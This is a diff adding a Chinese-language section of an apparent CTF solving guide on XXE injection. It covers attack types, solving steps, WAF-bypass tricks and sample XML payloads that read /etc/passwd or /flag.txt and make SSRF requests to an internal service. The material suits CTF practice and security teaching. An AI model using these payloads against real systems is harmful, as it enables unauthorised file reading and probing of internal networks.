@@ -1,0 +1,75 @@
+## **D. XXE（XML External Entity Injection）**
+
+### 1. 类型
+
+* 本地文件包含（LFI）- XXE
+* 远程文件包含（RFI）- XXE
+* SSRF - XXE
+* 基于错误的 XXE
+
+### 2. 解题输出思路
+
+1. 识别接受 XML 输入的端点
+2. 尝试注入外部实体
+3. 尝试读取本地文件（如 `/etc/passwd`）
+4. 尝试 SSRF 到内网服务
+5. 尝试基于错误的 XXE 泄露数据
+6. 输出 flag 或敏感信息
+
+### 3. 关注点
+
+* 是否解析 XML 输入
+* 是否允许外部实体（DOCTYPE）
+* 是否过滤了 `file://`, `http://` 等协议
+* 是否有 WAF 阻挡
+* 响应是否回显错误或实体内容
+
+### 4. 通用
+
+#### 通用步骤
+
+* 发送基础 XXE payload 测试
+* 测试读取 `/etc/passwd`
+
+* 利用 `<!ENTITY xxe SYSTEM "file:///flag.txt">]><root>&xxe;</root>`
+* 使用参数实体绕过 WAF
+* 利用 SSRF 访问内网服务
+
+### 5. 方法论
+
+* 利用 XML 解析器的外部实体功能
+* 绕过过滤机制
+* 流程：XML 输入点 → 实体注入 → 本地/远程文件读取 → flag 获取
+
+### 6. 启发性问题
+
+* 是否允许 `DOCTYPE` 定义？
+* 是否过滤了 `SYSTEM` 或 `PUBLIC`？
+* 是否允许 `file://` 或 `http://` 协议？
+* 是否有回显？
+
+### 7. 绕过技巧
+
+* 参数实体：`<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;`
+* CDATA 绕过
+* URL 编码绕过
+* 利用 DTD 外部子集
+
+### 8. 典型 payload
+
+#### 读取本地文件：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+<root>&xxe;</root>
+```
+
+#### SSRF 到内网：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/">]>
+<root>&xxe;</root>
+```
+
